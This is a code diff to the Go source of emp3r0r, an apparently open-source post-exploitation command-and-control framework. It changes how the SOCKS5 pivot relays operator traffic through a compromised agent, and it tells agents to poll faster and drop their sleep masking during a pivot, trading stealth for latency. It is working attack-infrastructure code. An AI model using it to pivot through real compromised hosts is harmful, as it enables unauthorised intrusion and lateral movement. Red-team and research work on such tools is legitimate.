@@ -31,12 +31,14 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/fxamacker/cbor/v2"
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/wireguard"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -81,6 +83,10 @@ const (
 // that stalls) must not pin the relay goroutine, the pending entry and the
 // bookkeeping forever. Vars so tests can shorten them.
 var (
+	// socks5ResultGrace bounds the wait for a relay stream after the agent's
+	// dispatch result arrives; the stream is already open by then, only the C2's
+	// matching is in flight.
+	socks5ResultGrace        = 3 * time.Second
 	socks5RelayIdleTimeout   = 15 * time.Minute
 	socks5RelayWatchInterval = 5 * time.Second
 )
@@ -107,16 +113,37 @@ type socks5ProxyEntry struct {
 	done       chan struct{} // closed once the relay is fully torn down
 	doneOnce   sync.Once
 	closeOnce  sync.Once
+	// A C agent always reports the result of the module it was dispatched, so
+	// the answer and the relay stream can cross. Whichever is decided first owns
+	// the CONNECT: a matched stream wins, and a failed CONNECT drops the stream
+	// that arrives afterwards.
+	matched atomic.Bool
+	failed  atomic.Bool
 }
 
 // markStreamUp records the agent's relay stream and notifies the SOCKS5
 // handler that the CONNECT can be answered.
 func (e *socks5ProxyEntry) markStreamUp(stream io.ReadWriteCloser) {
 	e.stream = stream
+	e.matched.Store(true)
 	e.streamOnce.Do(func() {
 		close(e.streamUp)
 	})
 }
+
+// failResult marks the CONNECT as failed on the agent's result. It reports false
+// when the relay stream already answered, so a matched stream is never torn down
+// by a result that merely crossed it.
+func (e *socks5ProxyEntry) failResult() bool {
+	if e.matched.Load() {
+		return false
+	}
+	e.failed.Store(true)
+	return true
+}
+
+// resultFailed reports whether the CONNECT was already answered as a failure.
+func (e *socks5ProxyEntry) resultFailed() bool { return e.failed.Load() }
 
 // teardown closes both legs of the relay exactly once and notifies waiters.
 func (e *socks5ProxyEntry) teardown() {
@@ -200,10 +227,9 @@ func StartSocks5Proxy(agentTag string, port int, bindAddr string) error {
 
 	agent := agents.GetAgentByTag(agentTag)
 	if agent == nil {
-		return fmt.Errorf("socks5: agent %s not found", agentTag)
-	}
-	if _, ctrl, found := agents.RuntimeControlByUUID(agent.UUID); !found || ctrl == nil || ctrl.Conn == nil {
-		return fmt.Errorf("socks5: agent %s is not connected", agentTag)
+		// Only an agent that passed its reported offline grace is dropped from
+		// the list; a sleeping (masked) agent stays listed and is accepted.
+		return fmt.Errorf("socks5: agent %s is gone (it left its offline grace)", agentTag)
 	}
 
 	if bindAddr == "" {
@@ -275,6 +301,18 @@ func StartSocks5Proxy(agentTag string, port int, bindAddr string) error {
 	socks5Proxies.mu.Unlock()
 
 	logging.Infof("SOCKS5 pivot started on %s:%d (relaying through agent %s)", bindAddr, port, util.AgentRef(agent.UUID))
+	// A C agent must pick pivot commands up quickly, so it polls more often and
+	// keeps its message window open longer while this pivot lives. Say so: the
+	// pivot trades stealth (shorter masked sleep, more activity) for latency,
+	// and the agent restores its profile when the pivot stops.
+	if modules.CanRunSocks5BOF(agent) {
+		logging.Warningf("SOCKS5 pivot on port %d: agent %s will poll every %ds with a %ds window and stay unmasked during relays until `socks_stop %d`; this raises detection risk",
+			port, util.AgentRef(agent.UUID), def.Socks5PivotPollInterval, def.Socks5PivotPollWindow, port)
+		tune := fmt.Sprintf("%s --mode on --interval %d --window %d", def.C2CmdProxyTune, def.Socks5PivotPollInterval, def.Socks5PivotPollWindow)
+		if err := sendAgentCommandOrQueue(tune, socksProxyTokenPrefix+"tune-"+uuid.NewString(), agent); err != nil {
+			logging.Warningf("socks5: tuning agent %s for the pivot: %v", util.AgentRef(agent.UUID), err)
+		}
+	}
 	for _, ln := range lns {
 		ls.wg.Add(1)
 		go ls.acceptLoop(ln)
@@ -301,6 +339,13 @@ func StopSocks5Proxy(port int, operatorID string) error {
 	}
 
 	logging.Infof("SOCKS5 pivot on port %d stopped", port)
+	// Give the agent its own poll profile back now that nothing is bound; the
+	// command is queued when the agent is dormant and applied at its next poll.
+	if agent := agents.GetAgentByTag(ls.agentTag); agent != nil && modules.CanRunSocks5BOF(agent) {
+		if err := sendAgentCommandOrQueue(def.C2CmdProxyTune+" --mode off", socksProxyTokenPrefix+"tune-"+uuid.NewString(), agent); err != nil {
+			logging.Warningf("socks5: restoring the poll profile of %s: %v", util.AgentRef(agent.UUID), err)
+		}
+	}
 	ls.cancel()
 	for _, ln := range ls.lns {
 		_ = ln.Close()
@@ -441,7 +486,9 @@ func (ls *socks5Listener) handleOperatorConn(conn net.Conn) {
 		_ = conn.SetDeadline(time.Time{})
 		target := net.JoinHostPort(host, strconv.Itoa(int(port)))
 		if err := ls.proxyToAgent(conn, target); err != nil {
-			logging.Debugf("socks5: %v", err)
+			// The operator's client sees the refusal reply; say why here so a
+			// failed CONNECT is diagnosable from the C2 log alone.
+			logging.Warningf("socks5: %v", err)
 		}
 	case socks5CmdUDPAssociate:
 		if err := ls.handleUDPAssociate(conn); err != nil {
@@ -482,7 +529,7 @@ func (ls *socks5Listener) proxyToAgent(sock net.Conn, target string) error {
 	live.CmdResultsReady.Store(token, resultCh)
 
 	cmdLine := fmt.Sprintf("%s --token %s --target %s", def.C2CmdProxyStart, token, target)
-	if err := agents.SendCmd(cmdLine, token, agent); err != nil {
+	if err := sendAgentCommandOrQueue(cmdLine, token, agent); err != nil {
 		clearProxyJobBookkeeping(token)
 		// Fail the operator's SOCKS5 CONNECT fast (agent offline/dead) instead
 		// of letting the client hang until its own timeout.
@@ -502,6 +549,19 @@ func (ls *socks5Listener) proxyToAgent(sock net.Conn, target string) error {
 		return nil
 
 	case <-resultCh:
+		// A C agent always reports the module result, success included, so give
+		// the relay stream the moment it needs to be matched before treating the
+		// answer as a dial failure.
+		select {
+		case <-entry.streamUp:
+			<-entry.done
+			return nil
+		case <-time.After(socks5ResultGrace):
+		}
+		if !entry.failResult() {
+			<-entry.done
+			return nil
+		}
 		errAny, _ := live.CmdResults.LoadAndDelete(token)
 		clearProxyJobBookkeeping(token)
 		_ = socks5Reply(sock, socks5RepConnectionRefused, "0.0.0.0", 0)
